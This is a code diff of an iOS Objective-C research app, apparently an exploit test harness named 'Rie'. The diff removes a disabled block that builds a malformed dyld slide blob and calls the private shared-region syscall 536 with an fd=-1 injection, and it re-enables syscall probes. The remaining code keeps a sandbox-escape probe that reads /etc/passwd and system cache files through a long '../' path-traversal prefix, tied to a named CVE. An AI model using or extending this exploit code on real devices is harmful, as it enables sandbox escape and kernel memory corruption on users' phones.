@@ -32,8 +32,6 @@
 #include <signal.h>
 #include <sys/wait.h>
 #include <spawn.h>
-// #include <fcntl.h> — needed for Phase E (disabled)
-// #include <sys/mman.h> — needed for Phase E (disabled)
 
 // ---- Rie probe helpers: all iOS-private APIs resolved via dlsym ----
 // Public POSIX/Mach headers may not declare all needed functions on iOS.
@@ -77,53 +75,6 @@ typedef kern_return_t (*Rie_ThreadSetStateFn)(thread_act_t, int, thread_state_t,
 #endif
 #ifndef POSIX_SPAWN_START_SUSPENDED
 #define POSIX_SPAWN_START_SUSPENDED 0x0100
-#endif
-
-// ── Rie: shared-region config structs (shared with child) ──
-#if 0
-#define SR_CFG_MAGIC 0x53524347u       // 'SRCG'
-#ifndef F_ADDFILESIGS_RETURN
-#define F_ADDFILESIGS_RETURN 97
-#endif
-#ifndef VM_PROT_SLIDE
-#define VM_PROT_SLIDE  0x20
-#endif
-#ifndef VM_PROT_NOAUTH
-#define VM_PROT_NOAUTH 0x40
-#endif
-
-
-struct sr_file_np {                    // == kernel's shared_file_np (12 bytes)
-    int      sf_fd;
-    uint32_t sf_mappings_count;
-    uint32_t sf_slide;
-};
-struct sr_mapping {                    // == kernel's shared_file_mapping_slide_np (48 bytes)
-    uint64_t sms_address;
-    uint64_t sms_size;
-    uint64_t sms_file_offset;
-    uint64_t sms_slide_size;
-    uint64_t sms_slide_start;
-    uint32_t sms_max_prot;
-    uint32_t sms_init_prot;
-};
-struct sr_cfg {
-    uint32_t magic;
-    uint32_t blob_off;
-    char     main_path[512];
-    char     sub_path[512];
-    struct   sr_file_np files[3];
-    struct   sr_mapping mappings[3];
-    uint64_t fault_addr;
-    uint64_t blob_size;
-};
-
-// Private fsignatures struct (not in public iOS SDK)
-typedef struct {
-    off_t   fs_file_start;
-    void   *fs_blob_start;
-    size_t  fs_blob_size;
-} rie_fsignatures_t;
 #endif
 
 // RIE_PROBE_OFFSET — replaced at build time by CI
@@ -947,7 +898,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie Direct 536 (v216)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie + Sandbox Escape (v213)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9170,12 +9121,13 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v216: syscall + Phase E (no child, fd=-1 inject) ===\n"];
-        NSString *traversalPrefix = @"../../../../../../../../../../../../../";
+        [self appendLog:@"\n=== Rie v213: syscall + API + sandbox escape + AppIntent ===\n"];
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
         [self appendLog:@"── Phase S: sandbox escape probe ──"];
         {
+            // Technique: prepend ../../../../../.. then expandingTildeInPath resolves to /
+            NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
             // Test 1: read /etc/passwd via path traversal
             NSString *passwdRaw = [traversalPrefix stringByAppendingString:@"etc/passwd"];
@@ -9390,7 +9342,6 @@ static uint64_t rie_find_exec_base(task_t task,
             }
 
             // Phase D: syscall 536 probe — find shared cache via VM regions
-#if 0
             [self appendLog:@"\n-- Phase D: syscall 536 probe --"];
 
             // Resolve mach_vm_region_recurse now for VM region scan
@@ -9446,220 +9397,7 @@ static uint64_t rie_find_exec_base(task_t task,
             // Test syscall 536 with NULL args
             long rNull = sc(536, NULL, NULL, NULL, NULL);
             [self appendLog:[NSString stringWithFormat:@"syscall(536, NULL,NULL,NULL,NULL): ret=%ld errno=%d", rNull, errno]];
-#endif
-
-            // ── Phase E: Direct syscall 536 — parse cache from SR memory, build blob ──
-#if 0
-            [self appendLog:@"\n── Phase E: direct syscall 536 (no child, fd=-1 inject) ──"];
-
-            // Step 1: read dyld cache header from shared region memory @ 0x180000000
-            const uint8_t *sr_base = (const uint8_t *)0x180000000ULL;
-            uint32_t hdrMagic; memcpy(&hdrMagic, sr_base, 4);
-            [self appendLog:[NSString stringWithFormat:@"SR[0x180000000] magic=0x%08x '%.4s'", hdrMagic, (char*)&hdrMagic]];
-            // dyld_v1 magic = 0x31766c64 (little-endian "dyld_v1" -> 'dyld' at offset 0)
-            if (hdrMagic != 0x64796c64) { // "dyld" BE view
-                [self appendLog:@"!! not a dyld_v1 header at 0x180000000"];
-            } else {
-                // Parse key header fields (all LE; offsets from dyld_cache_header)
-                #define RIE_RD32(off) (*(uint32_t*)(sr_base + (off)))
-                #define RIE_RD64(off) (*(uint64_t*)(sr_base + (off)))
-                uint32_t mws_off  = RIE_RD32(0x138);
-                uint32_t mws_cnt  = RIE_RD32(0x13c);
-                uint32_t img_cnt  = RIE_RD32(0x170);
-                uint64_t cs_off   = RIE_RD64(0x028);
-                uint64_t cs_sz    = RIE_RD64(0x030);
-                uint64_t sc_offset= RIE_RD64(0x040);
-                [self appendLog:[NSString stringWithFormat:@"mappingWithSlide: off=0x%x cnt=%u", mws_off, mws_cnt]];
-                [self appendLog:[NSString stringWithFormat:@"images=%u codeSig=0x%llx+0x%llx sharedRegion=0x%llx",
-                    img_cnt, cs_off, cs_sz, sc_offset]];
-                #undef RIE_RD32
-                #undef RIE_RD64
-
-                // Step 2: walk MWS entries, find non-auth DATA slide carrier
-                #define MWS_SIZE 56
-                int foundNonAuth = -1;
-                uint64_t naAddr=0, naSize=0, naFoff=0, naSlide=0, naFlags=0;
-                uint32_t naMax=0, naInit=0;
-                for (uint32_t i = 0; i < mws_cnt && i < 20; i++) {
-                    const uint8_t *m = sr_base + mws_off + i * MWS_SIZE;
-                    uint64_t addr, sz, foff, slideSize, flags;
-                    uint32_t maxProt, initProt;
-                    memcpy(&addr,  m+0,  8); memcpy(&sz,    m+8,  8);
-                    memcpy(&foff, m+16, 8); memcpy(&slideSize, m+32, 8);
-                    memcpy(&flags,m+40, 8); memcpy(&maxProt, m+48, 4);
-                    memcpy(&initProt,m+52, 4);
-                    BOOL isSlide = (slideSize != 0);
-                    BOOL isAuth  = (flags & 1);
-                    NSString *tag = isSlide ? (isAuth ? @"AUTH-SLIDE" : @"<<< NONAUTH-SLIDE <<<") : @"NOSLIDE";
-                    [self appendLog:[NSString stringWithFormat:@"  MWS[%u] a=0x%llx sz=0x%llx sl=0x%llx fl=0x%llx p=%x/%x %@",
-                        i, addr, sz, slideSize, flags, maxProt, initProt, tag]];
-                    if (isSlide && !isAuth && foundNonAuth < 0) {
-                        foundNonAuth = (int)i;
-                        naAddr=addr; naSize=sz; naFoff=foff; naSlide=slideSize; naFlags=flags;
-                        naMax=maxProt; naInit=initProt;
-                    }
-                }
-                if (foundNonAuth < 0) {
-                    [self appendLog:@"!! no non-auth slide carrier found in MWS"];
-                } else {
-                    [self appendLog:[NSString stringWithFormat:@"target non-auth carrier: MWS[%d] addr=0x%llx sz=0x%llx foff=0x%llx slide=0x%llx flags=0x%llx max=%x init=%x",
-                        foundNonAuth, naAddr, naSize, naFoff, naSlide, naFlags, naMax, naInit]];
-
-                    // Step 3: try Cryptex paths to find the cache file
-                    [self appendLog:@"\n-- cache file probe --"];
-                    const char *cachePaths[] = {
-                        "/System/Library/dyld/dyld_shared_cache_arm64e",
-                        "/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64e",
-                        "/System/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
-                        "/private/preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
-                        "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e",
-                        NULL,
-                    };
-                    int cacheFD = -1;
-                    NSString *cacheResolved = nil;
-                    for (int pi = 0; cachePaths[pi]; pi++) {
-                        NSString *raw = [traversalPrefix stringByAppendingString:
-                            [NSString stringWithUTF8String:cachePaths[pi]]];
-                        NSString *resolved = [raw stringByExpandingTildeInPath];
-                        cacheFD = open([resolved UTF8String], O_RDONLY);
-                        if (cacheFD >= 0) {
-                            cacheResolved = resolved;
-                            [self appendLog:[NSString stringWithFormat:@"  FOUND: %@ (fd=%d)", resolved, cacheFD]];
-                            break;
-                        }
-                        [self appendLog:[NSString stringWithFormat:@"  miss: %@ (errno=%d)", resolved, errno]];
-                    }
-
-                    // Step 4: try to read subcache suffix from main cache header
-                    uint32_t subOff  = *(uint32_t*)(sr_base + 0x188);
-                    uint32_t subCnt  = *(uint32_t*)(sr_base + 0x18c);
-                    [self appendLog:[NSString stringWithFormat:@"subCacheArray: off=0x%x cnt=%u", subOff, subCnt]];
-                    if (subCnt > 0 && subCnt < 10) {
-                        for (uint32_t si = 0; si < subCnt; si++) {
-                            const uint8_t *se = sr_base + subOff + si * 56;
-                            char suffix[33] = {0};
-                            memcpy(suffix, se + 24, 32);
-                            [self appendLog:[NSString stringWithFormat:@"  sub[%u] suffix='%s'", si, suffix]];
-                            // Try opening subcache with this suffix on found cache dirs
-                            for (int pi = 0; cachePaths[pi] && strlen(suffix) > 0; pi++) {
-                                char subPath[1024];
-                                // Replace basename with basename+suffix
-                                snprintf(subPath, sizeof(subPath), "%s%s", cachePaths[pi], suffix);
-                                NSString *raw = [traversalPrefix stringByAppendingString:
-                                    [NSString stringWithUTF8String:subPath]];
-                                NSString *resolved = [raw stringByExpandingTildeInPath];
-                                int sfd = open([resolved UTF8String], O_RDONLY);
-                                if (sfd >= 0) {
-                                    [self appendLog:[NSString stringWithFormat:@"    subcache OPEN: %@ (fd=%d)", resolved, sfd]];
-                                    close(sfd);
-                                }
-                            }
-                        }
-                    }
-
-                    // Step 5: build slide blob and test syscall 536
-                    [self appendLog:@"\n-- slide blob + syscall 536 test --"];
-                    if (cacheFD < 0) {
-                        [self appendLog:@"!! no cache file open — cannot register code sig"];
-                    } else {
-                        // Try F_ADDFILESIGS_RETURN to register code signature
-                        rie_fsignatures_t fs;
-                        memset(&fs, 0, sizeof(fs));
-                        fs.fs_file_start = 0;
-                        fs.fs_blob_start = (void *)(uintptr_t)cs_off;
-                        fs.fs_blob_size = (size_t)cs_sz;
-                        int fsigRC = fcntl(cacheFD, F_ADDFILESIGS_RETURN, &fs);
-                        [self appendLog:[NSString stringWithFormat:@"F_ADDFILESIGS(fd=%d): rc=%d errno=%d",
-                            cacheFD, fsigRC, errno]];
-
-                        // Build minimal slide blob (v5 format, 16KB pages)
-                        #define BLOB_PAGE_SIZE 0x4000
-                        #define BLOB_PAGE_COUNT 64
-                        #define BLOB_TARGET_PAGE 2
-                        #define BLOB_OOB_DELTA 0xFFFE
-                        size_t blob_hdr_size = 24; // v5 header
-                        size_t blob_ps_size  = BLOB_PAGE_COUNT * 2; // uint16_t page_starts[]
-                        size_t blob_total = blob_hdr_size + blob_ps_size;
-                        uint8_t *blob = (uint8_t *)calloc(1, blob_total);
-                        if (!blob) {
-                            [self appendLog:@"!! blob alloc failed"];
-                        } else {
-                            // Build v5 header
-                            uint32_t ver = 5, ps = BLOB_PAGE_SIZE, psc = BLOB_PAGE_COUNT;
-                            uint64_t va = 0; // value_add = 0 for test
-                            memcpy(blob + 0,  &ver, 4);
-                            memcpy(blob + 4,  &ps,  4);
-                            memcpy(blob + 8,  &psc, 4);
-                            memcpy(blob + 16, &va,  8);
-                            // page_starts: all NO_REBASE except TARGET_PAGE
-                            uint16_t *pstarts = (uint16_t *)(blob + 24);
-                            for (uint32_t j = 0; j < BLOB_PAGE_COUNT; j++)
-                                pstarts[j] = 0xFFFF; // NO_REBASE
-                            pstarts[BLOB_TARGET_PAGE] = BLOB_OOB_DELTA;
-                            [self appendLog:[NSString stringWithFormat:@"blob: ver=%u ps=0x%x cnt=%u target[%u]=0x%x total=%zu",
-                                ver, ps, psc, BLOB_TARGET_PAGE, BLOB_OOB_DELTA, blob_total]];
-
-                            // Allocate cfg + blob in our VM space
-                            #define CFG_SIZE (sizeof(sr_cfg) + 0x4000)
-                            void *cfg_buf = mmap(NULL, CFG_SIZE, PROT_READ|PROT_WRITE,
-                                MAP_PRIVATE|MAP_ANON, -1, 0);
-                            if (cfg_buf == MAP_FAILED) {
-                                [self appendLog:@"!! cfg mmap failed"];
-                            } else {
-                                memset(cfg_buf, 0, CFG_SIZE);
-                                struct sr_cfg *cfg = (struct sr_cfg *)cfg_buf;
-                                cfg->magic = SR_CFG_MAGIC;
-                                cfg->blob_off = 0x4000;   // blob on page 2
-                                snprintf(cfg->main_path, sizeof(cfg->main_path), "%s",
-                                    cacheResolved ? [cacheResolved UTF8String] : "");
-                                cfg->files[0].sf_fd = -1;   // fd to be opened by syscall
-                                cfg->files[0].sf_mappings_count = 1;
-                                cfg->files[0].sf_slide = 0;
-                                cfg->files[1].sf_fd = -1;   // fd=-1 inject
-                                cfg->files[1].sf_mappings_count = 1;
-                                cfg->files[1].sf_slide = 0;
-                                // mappings[0]: header at its existing address
-                                cfg->mappings[0].sms_address = 0x180000000ULL;
-                                cfg->mappings[0].sms_size = naSize;
-                                cfg->mappings[0].sms_file_offset = 0;
-                                cfg->mappings[0].sms_slide_size = 0;
-                                cfg->mappings[0].sms_max_prot = 1; // VM_PROT_READ
-                                cfg->mappings[0].sms_init_prot = 1;
-                                // mappings[1]: fd=-1 inject blob into shared region
-                                uint64_t blob_sr = 0x180000000ULL + naSize; // after header
-                                cfg->mappings[1].sms_address = blob_sr;
-                                cfg->mappings[1].sms_size = 0x4000;
-                                cfg->mappings[1].sms_file_offset = (uint64_t)(uintptr_t)((uint8_t*)cfg_buf + 0x4000);
-                                cfg->mappings[1].sms_slide_size = 0;
-                                cfg->mappings[1].sms_max_prot = 1;
-                                cfg->mappings[1].sms_init_prot = 1;
-                                cfg->fault_addr = naAddr; // the carrier base
-                                cfg->blob_size = blob_total;
-                                memcpy((uint8_t*)cfg_buf + 0x4000, blob, blob_total);
-
-                                [self appendLog:[NSString stringWithFormat:@"cfg@%p blob_sr=0x%llx fault=0x%llx blobSz=%zu",
-                                    cfg_buf, blob_sr, cfg->fault_addr, blob_total]];
-
-                                // Test syscall 536 with 1 file (fd=-1 inject only)
-                                long r536_1 = sc(536, 1, cfg->files, 1, cfg->mappings);
-                                [self appendLog:[NSString stringWithFormat:@"syscall(536, 1file, 1map): ret=%ld errno=%d",
-                                    r536_1, errno]];
-                                // Test with 2 files
-                                long r536_2 = sc(536, 2, cfg->files, 2, cfg->mappings);
-                                [self appendLog:[NSString stringWithFormat:@"syscall(536, 2file, 2map): ret=%ld errno=%d",
-                                    r536_2, errno]];
-
-                                munmap(cfg_buf, CFG_SIZE);
-                            }
-                            free(blob);
-                        }
-                        close(cacheFD);
-                    }
-                }
-                #undef MWS_SIZE
-            }
         }
-#endif
 
         // ── Phase B: API availability scan ──
         [self appendLog:@"\n── Phase B: API availability scan ──"];
